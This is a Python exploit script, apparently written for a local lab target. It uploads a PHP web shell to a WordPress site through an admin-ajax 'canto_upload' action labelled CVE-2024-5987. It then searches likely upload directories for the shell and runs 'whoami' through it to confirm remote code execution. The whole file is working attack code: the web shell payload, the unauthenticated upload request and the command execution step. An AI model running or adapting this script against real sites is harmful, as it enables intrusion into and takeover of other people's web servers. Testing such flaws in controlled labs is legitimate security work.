import requests
import re

# Configuration
target_url = "http://127.0.0.1:32816"
ajax_url = f"{target_url}/wp-admin/admin-ajax.php"
shell_name = "shell.php"
shell_content = '<?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";die;}?>'

# WordPress session cookie from previous authentication
cookies = {
    'wordpress_test_cookie': 'WP%20Cookie%20check'
}

# Set up the multipart form data for file upload
files = {
    'action': (None, 'canto_upload'),
    'type': (None, 'media'),
    'file': (shell_name, shell_content, 'application/x-php')
}

print(f"[+] Testing CVE-2024-5987 at {ajax_url}")
print(f"[+] Uploading webshell: {shell_name}")
print(f"[+] Shell content length: {len(shell_content)} bytes")
print(f"[+] Using cookies: {cookies}\n")

try:
    # Send the upload request
    upload_response = requests.post(
        ajax_url,
        files=files,
        cookies=cookies,
        timeout=30
    )
    
    print(f"[+] Upload Response Status: {upload_response.status_code}")
    print(f"[+] Upload Response Headers: {dict(upload_response.headers)}")
    print(f"[+] Upload Response Body:\n{upload_response.text}\n")

    # Check for success indicators in response
    success_indicators = ['success', 'uploaded', 'url', 'file', 'name', shell_name]
    response_text_lower = upload_response.text.lower()
    
    upload_successful = False
    for indicator in success_indicators:
        if indicator in response_text_lower:
            upload_successful = True
            print(f"[+] Success indicator found in response: '{indicator}'")
    
    if not upload_successful:
        print(f"[!] No obvious success indicators in upload response")
    else:
        print(f"[+] File upload appears successful based on response")
    
    # Extract potential upload path if in response
    path_patterns = [
        r'(?:url|path|file|location)"?\s*[:=]\s*"?([^"\s]+shell\.php[^"\s]*)',
        r'(?:wp-content\/uploads\/[^"\s]*shell\.php[^"\s]*)',
        r'\/(?:wp-content\/uploads[^"\s]*shell\.php[^"\s]*)'
    ]
    
    uploaded_path = None
    for pattern in path_patterns:
        matches = re.findall(pattern, upload_response.text, re.I)
        if matches:
            uploaded_path = matches[0]
            print(f"[+] Extracted upload path from response: {uploaded_path}")
            break
    
    # Common upload paths to test
    common_paths = [
        "/wp-content/uploads/2024/06/shell.php",
        "/wp-content/uploads/shell.php", 
        "/wp-content/uploads/2024/shell.php",
        "/wp-content/uploads/canto/shell.php",
        "/wp-content/uploads/canto-media/shell.php",
        "/wp-content/uploads/2024/08/shell.php"
    ]
    
    print(f"\n[+] Attempting to access uploaded shell at common paths...")
    
    shell_accessible = False
    shell_location = None
    
    for path in common_paths:
        full_url = f"{target_url}{path}"
        print(f"\n[+] Testing: {full_url}")
        
        try:
            access_response = requests.get(full_url, timeout=15)
            print(f"[+] Status: {access_response.status_code}")
            print(f"[+] Content length: {len(access_response.content)}B")
            
            if access_response.status_code == 200 and '<?php' not in access_response.text:
                print(f"[+] Shell appears to be accessible and executing!")
                print(f"[+] Response preview:\n{access_response.text[:500]}")
                shell_accessible = True
                shell_location = full_url
                break
            elif access_response.status_code == 200 and '<?php' in access_response.text:
                print(f"[!] File is accessible but not executing (source code visible)")
            else:
                print(f"[!] Could not access shell at this path")
                
        except Exception as e:
            print(f"[!] Error accessing {path}: {e}")
    
    if shell_accessible and shell_location:
        print(f"\n[+] SUCCESS: Webshell is accessible at {shell_location}")
        print(f"[+] Attempting command execution: whoami")
        
        # Execute whoami command via webshell
        cmd_url = f"{shell_location}?cmd=whoami"
        try:
            cmd_response = requests.get(cmd_url, timeout=15)
            print(f"[+] Command Execution Response Status: {cmd_response.status_code}")
            print(f"[+] Command Execution Response:\n{cmd_response.text}")
            
            # Extract command output (between <pre> tags)
            cmd_output = re.findall(r'<pre>(.*?)</pre>', cmd_response.text, re.DOTALL | re.I)
            if cmd_output:
                print(f"\n[!] COMMAND OUTPUT: whoami = {cmd_output[0].strip()}")
                print(f"[!] RCE CONFIRMED - CVE-2024-5987 EXPLOITATION SUCCESSFUL")
            else:
                print(f"[?] Command executed but output format unexpected")
                
        except Exception as e:
            print(f"[!] Error executing command: {e}")
            
    else:
        print(f"[!] Could not access uploaded shell at any common location")
        
except Exception as e:
    print(f"[!] Error during exploit test: {e}")
